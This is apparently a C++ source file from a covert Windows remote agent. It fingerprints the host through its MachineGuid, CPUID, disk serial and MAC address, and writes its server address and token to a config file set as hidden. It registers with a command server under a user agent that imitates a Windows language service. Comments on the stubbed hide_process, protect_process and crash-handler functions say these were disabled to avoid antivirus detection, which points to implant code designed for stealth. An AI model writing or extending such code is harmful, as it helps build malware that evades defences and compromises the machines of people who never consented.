#include "win_utils.h"
#include "utils/logger.h"
#include <fstream>
#include <sstream>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <intrin.h>

#include <winhttp.h>
#include <iphlpapi.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")

namespace agent {

void WinUtils::hide_process() {
    // No-op — process hiding triggers AV behavioral detection
}

void WinUtils::protect_process() {
    // No-op — DACL manipulation triggers AV behavioral detection
}

void WinUtils::install_crash_handler() {
    // No-op — crash handler with process spawn triggers AV
}

std::string WinUtils::get_hostname() {
    char buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) {
        return std::string(buf, size);
    }
    return "unknown";
}

// SHA-256 using Windows CryptoAPI
static std::string sha256_hex(const std::string& input) {
    HCRYPTPROV prov = 0;
    HCRYPTHASH hash = 0;
    std::string result;

    if (!CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return "";
    }
    if (!CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) {
        CryptReleaseContext(prov, 0);
        return "";
    }
    CryptHashData(hash, reinterpret_cast<const BYTE*>(input.data()),
                  static_cast<DWORD>(input.size()), 0);

    DWORD hash_len = 32;
    BYTE hash_bytes[32];
    CryptGetHashParam(hash, HP_HASHVAL, hash_bytes, &hash_len, 0);

    static constexpr char hex_chars[] = "0123456789abcdef";
    result.reserve(64);
    for (DWORD i = 0; i < hash_len; ++i) {
        result += hex_chars[(hash_bytes[i] >> 4) & 0x0F];
        result += hex_chars[hash_bytes[i] & 0x0F];
    }

    CryptDestroyHash(hash);
    CryptReleaseContext(prov, 0);
    return result;
}

std::string WinUtils::get_hwid() {
    std::ostringstream fingerprint;

    // 1. MachineGuid from registry (stable across reboots)
    {
        HKEY key = nullptr;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Cryptography", 0,
                KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
            char buf[256] = {};
            DWORD buf_size = sizeof(buf);
            DWORD type = 0;
            if (RegQueryValueExA(key, "MachineGuid", nullptr, &type,
                    reinterpret_cast<LPBYTE>(buf), &buf_size) == ERROR_SUCCESS) {
                fingerprint << "MG:" << buf << "|";
            }
            RegCloseKey(key);
        }
    }

    // 2. CPUID — processor brand/serial info
    {
        int cpu_info[4] = {};
        __cpuid(cpu_info, 0);
        int max_id = cpu_info[0];
        fingerprint << "CPU0:" << cpu_info[1] << cpu_info[2] << cpu_info[3] << "|";

        if (max_id >= 1) {
            __cpuid(cpu_info, 1);
            fingerprint << "CPU1:" << cpu_info[0] << cpu_info[3] << "|";
        }
    }

    // 3. C: drive volume serial number
    {
        DWORD serial = 0;
        if (GetVolumeInformationA("C:\\", nullptr, 0, &serial,
                nullptr, nullptr, nullptr, 0)) {
            fingerprint << "VOL:" << serial << "|";
        }
    }

    // 4. First physical MAC address
    {
        ULONG buf_len = 0;
        GetAdaptersInfo(nullptr, &buf_len);
        if (buf_len > 0) {
            std::vector<char> buf(buf_len);
            auto* adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
            if (GetAdaptersInfo(adapter, &buf_len) == ERROR_SUCCESS) {
                // Find first non-zero MAC (skip virtual adapters with all-zero MAC)
                while (adapter) {
                    if (adapter->AddressLength == 6) {
                        bool all_zero = true;
                        for (UINT i = 0; i < 6; ++i) {
                            if (adapter->Address[i] != 0) { all_zero = false; break; }
                        }
                        if (!all_zero) {
                            fingerprint << "MAC:";
                            for (UINT i = 0; i < 6; ++i) {
                                if (i > 0) fingerprint << ':';
                                fingerprint << std::hex
                                            << static_cast<int>(adapter->Address[i]);
                            }
                            fingerprint << std::dec << "|";
                            break;
                        }
                    }
                    adapter = adapter->Next;
                }
            }
        }
    }

    std::string raw = fingerprint.str();
    if (raw.empty()) {
        Logger::error("failed to collect any hardware info for HWID");
        return "";
    }

    std::string hwid = sha256_hex(raw);
    Logger::info("HWID generated: " + hwid);
    return hwid;
}

static std::string trim(const std::string& s) {
    auto start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    auto end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

bool WinUtils::read_config_file(const std::string& path, std::string& server_host,
                                  uint16_t& server_port, std::string& agent_id,
                                  std::string& agent_token) {
    std::ifstream f(path);
    if (!f.is_open()) return false;

    std::string line;
    while (std::getline(f, line)) {
        line = trim(line);
        if (line.empty() || line[0] == '#') continue;

        auto eq = line.find('=');
        if (eq == std::string::npos) continue;

        std::string key = trim(line.substr(0, eq));
        std::string value = trim(line.substr(eq + 1));

        if (key == "server_host") server_host = value;
        else if (key == "server_port") {
            char* end = nullptr;
            long port = strtol(value.c_str(), &end, 10);
            if (end != value.c_str() && port > 0 && port <= 65535) {
                server_port = static_cast<uint16_t>(port);
            }
        }
        else if (key == "agent_id") agent_id = value;
        else if (key == "agent_token") agent_token = value;
    }

    return !agent_id.empty() && !agent_token.empty();
}

bool WinUtils::write_hidden_config(const std::string& path, const std::string& server_host,
                                    uint16_t server_port, const std::string& agent_id,
                                    const std::string& agent_token) {
    std::ofstream f(path);
    if (!f.is_open()) return false;
    f << "server_host = " << server_host << "\n"
      << "server_port = " << server_port << "\n"
      << "agent_id = " << agent_id << "\n"
      << "agent_token = " << agent_token << "\n";
    f.close();

    // Set hidden + system attributes
    int wlen = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
    std::wstring wide(wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, wide.data(), wlen);
    SetFileAttributesW(wide.c_str(), FILE_ATTRIBUTE_HIDDEN);

    Logger::info("hidden config written to " + path);
    return true;
}

bool WinUtils::http_register_agent(const std::string& server_host, uint16_t server_port,
                                    const std::string& name, const std::string& hwid,
                                    std::string& out_id, std::string& out_token) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, server_host.c_str(), -1, nullptr, 0);
    std::wstring wide_host(wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, server_host.c_str(), -1, wide_host.data(), wlen);

    HINTERNET session = WinHttpOpen(L"IMLangService/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    HINTERNET connection = WinHttpConnect(session, wide_host.c_str(), server_port, 0);
    if (!connection) {
        WinHttpCloseHandle(session);
        return false;
    }

    HINTERNET request = WinHttpOpenRequest(connection, L"POST", L"/api/agents",
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!request) {
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return false;
    }

    std::string body = "{\"name\":\"" + name + "\",\"hwid\":\"" + hwid + "\"}";
    LPCWSTR headers = L"Content-Type: application/json\r\n";

    BOOL sent = WinHttpSendRequest(request, headers, static_cast<DWORD>(-1),
        const_cast<char*>(body.c_str()), static_cast<DWORD>(body.size()),
        static_cast<DWORD>(body.size()), 0);
    if (!sent) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return false;
    }

    if (!WinHttpReceiveResponse(request, nullptr)) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(session);
        return false;
    }

    // Read response body
    std::string response;
    DWORD bytes_available = 0;
    while (WinHttpQueryDataAvailable(request, &bytes_available) && bytes_available > 0) {
        std::vector<char> buf(bytes_available);
        DWORD bytes_read = 0;
        WinHttpReadData(request, buf.data(), bytes_available, &bytes_read);
        response.append(buf.data(), bytes_read);
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);

    // Parse JSON response: {"id":"xxx","token":"yyy","name":"zzz"}
    auto extract = [&response](const std::string& key) -> std::string {
        std::string search = "\"" + key + "\":\"";
        auto pos = response.find(search);
        if (pos == std::string::npos) return "";
        pos += search.size();
        auto end = response.find('"', pos);
        if (end == std::string::npos) return "";
        return response.substr(pos, end - pos);
    };

    out_id = extract("id");
    out_token = extract("token");

    if (out_id.empty() || out_token.empty()) {
        Logger::error("registration failed, response: " + response);
        return false;
    }

    Logger::info("registered with server: id=" + out_id);
    return true;
}

HANDLE WinUtils::create_single_instance_mutex(const std::string& name) {
    int wlen = MultiByteToWideChar(CP_UTF8, 0, name.c_str(), -1, nullptr, 0);
    std::wstring wide(wlen - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, name.c_str(), -1, wide.data(), wlen);
    HANDLE mutex = CreateMutexW(nullptr, TRUE, wide.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (mutex) CloseHandle(mutex);
        return nullptr; // Another instance is running
    }
    return mutex;
}

} // namespace agent
